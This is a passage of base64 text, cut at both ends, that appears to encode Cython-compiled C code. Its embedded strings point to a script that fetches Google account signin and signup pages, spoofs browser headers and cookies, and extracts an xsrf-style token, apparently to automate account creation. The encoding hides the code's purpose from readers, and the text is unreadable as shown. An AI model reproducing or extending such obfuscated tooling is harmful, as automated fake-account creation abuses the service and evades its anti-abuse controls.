lbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdF84ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8sIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF92X24yID0gKChQeU9iamVjdCopX19weXhfdF84KTsKICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7CiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X2J1aWx0aW5fcmFuZ2U7IAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF90XzV9OwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICB9CiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfM3RsbF82Z2VuZXhwcigoKFB5T2JqZWN0KilfX3B5eF9jdXJfc2NvcGUpLCBfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdF84ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3RfNyA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfLCBfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdl9ob3N0ID0gX19weXhfdF83OwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgOTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMikgPCAoMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FyX0lRX2FyX3FfMF85X2VuX0lRX3FfMF84X2VuX3EpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgfQogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJfYWdlbnQsIF9fcHl4X3RfNikgPCAoMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF92X2hlMyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgOTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbmlufTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZTMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF83ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXMxID0gX19weXhfdF83OwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXMxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDk5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGF0YV9pbml0aWFsX3NldHVwX2RhdGFfcXVvdF9xdW8sIF9fcHl4X3RfOH07CiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIH0KICAgICAgX19weXhfdl9tYXRjaCA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfbWF0Y2gpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMDAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAobGlrZWx5KF9fcHl4X3RfMTApKSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3ZfbWF0Y2g7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMn07CiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JvdXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIH0KICAgICAgICBfX3B5eF92X3RvayA9IF9fcHl4X3RfNzsKICAgICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgICAKICAgICAgICBnb3RvIF9fcHl4X0w5OwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICAgIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKTsKICAgICAgICBfX3B5eF90XzggPSAoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSk7IAogICAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ub2tlbl9ub3RfZm91bmR9OwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1JhaXNlKF9fcHl4X3RfNywgMCwgMCwgMCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgX19QWVhfRVJSKDAsIDEwMywgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfTDk6OwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19weXhfdl9jb29raWVzID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoOCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXV0aG9yaXR5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY291bnRzX2dvb2dsZV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgTlVMTH07CiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICB9CiAgICAgIGlmIChQeURpY